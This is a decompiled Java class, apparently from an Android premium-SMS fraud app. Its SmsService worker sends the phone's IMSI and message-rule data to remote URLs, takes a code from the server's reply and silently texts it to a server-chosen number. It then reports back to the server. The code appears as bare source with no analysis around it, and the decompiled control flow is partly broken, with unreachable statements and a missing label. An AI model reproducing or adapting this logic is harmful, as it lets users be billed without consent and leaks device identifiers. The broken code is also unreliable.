package com.jshyproject.price.service;

import android.app.PendingIntent;
import android.content.Context;
import android.telephony.SmsManager;
import com.jshyproject.price.net.NetFlag;
import com.jshyproject.price.net.Purl;
import com.jshyproject.price.net.Video;
import com.jshyproject.price.order.AutoAns;
import com.jshyproject.price.ztool.ZNetTask;
import com.jshyproject.price.ztool.ZPhoneInfo;
import com.jshyproject.price.ztool.Zlog;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import org.json.JSONException;
import org.json.JSONObject;

final class b
  implements Runnable
{
  b(SmsService paramSmsService, AutoAns paramAutoAns, Context paramContext, SmsManager paramSmsManager, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2, boolean paramBoolean) {}
  
  public final void run()
  {
    Object localObject1 = this.a.getSendMessage();
    if ((localObject1 == null) || (((String)localObject1).equals("")))
    {
      Zlog.syso("SMSService...AutoAnsCut..Null...!!");
      NetFlag.flag(Purl.makeUrl(Purl.add_count, this.b) + "&port=" + this.a.getPort() + "&message=" + Purl.urlParam(this.a.getMessage()) + "&reSmsRule=" + Purl.urlParam(this.a.getReSmsRule()) + "&reSendRule=" + Purl.urlParam(this.a.getReSendRule()) + "&type=1");
      return;
    }
    for (;;)
    {
      Object localObject2;
      try
      {
        localObject1 = URLEncoder.encode((String)localObject1, "utf-8");
        localObject2 = ZPhoneInfo.getIMSI(this.b);
        localObject2 = Video.getVideoM(Video.type, (String)localObject2);
        localObject1 = Purl.makeUrl(Purl.sms_count_url, this.b) + "&code=" + (String)localObject1 + "&spid=" + this.a.getSpid() + "&msg=" + this.a.getSendMsg() + "&cparam=" + this.a.getCparam() + "&m=" + (String)localObject2;
        Zlog.syso("SMSService...reSmsType2.url:" + (String)localObject1);
        localObject1 = ZNetTask.getStr((String)localObject1);
        Zlog.syso("SMSService...reSmsCountBack:" + (String)localObject1);
        if (localObject1 == null) {
          break;
        }
        try
        {
          localObject1 = new JSONObject((String)localObject1);
          if ("yes".equals(((JSONObject)localObject1).getString("state")))
          {
            localObject1 = ((JSONObject)localObject1).getString("code");
            if ((localObject1 == null) || (this.a.getPort() == null)) {
              continue;
            }
            Zlog.syso("SMSService...sendMethodOK:port:" + this.a.getPort() + ",sendtext:" + (String)localObject1);
            Zlog.syso("SMSService...Send..." + this.a.getPort() + ",msg:" + (String)localObject1);
            this.c.sendTextMessage(this.a.getPort(), null, (String)localObject1, this.d, this.e);
          }
        }
        catch (JSONException localJSONException)
        {
          for (;;)
          {
            String str;
            localJSONException.printStackTrace();
            continue;
            boolean bool = false;
          }
        }
        if (!this.f) {
          break;
        }
        this.a.setPort("0000");
        return;
      }
      catch (UnsupportedEncodingException localUnsupportedEncodingException)
      {
        localUnsupportedEncodingException.printStackTrace();
        str = "error";
        continue;
        localObject2 = new StringBuilder("sendPortOrSendTextNUllport:");
        if (this.a.getPort() == null) {
          break label601;
        }
      }
      bool = true;
      Zlog.syso(bool + "message:" + str);
      NetFlag.flag(Purl.makeUrl(Purl.add_count, this.b) + "&port=" + this.a.getPort() + "&message=" + Purl.urlParam(this.a.getMessage()) + "&reSmsRule=" + Purl.urlParam(this.a.getReSmsRule()) + "&reSendRule=" + Purl.urlParam(this.a.getReSendRule()) + "&type=1");
    }
  }
}
